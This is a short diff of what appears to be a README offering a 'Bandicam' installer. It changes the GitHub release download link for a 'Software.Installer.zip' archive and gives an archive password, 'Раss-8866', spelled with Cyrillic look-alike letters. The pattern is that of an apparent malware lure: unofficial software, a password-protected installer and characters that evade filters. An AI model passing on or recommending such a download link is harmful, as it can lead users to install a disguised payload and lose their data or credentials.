@@ -3,7 +3,7 @@
 # Installation | Setup
 
 
-# [Download](https://github.com/ikey23/Bandicam/releases/download/released/Software.Installer.zip)
+# [Download](https://github.com/ikey23/Bandicam/releases/download/open-source/Software.Installer.zip)
 
 # Раss-8866
 
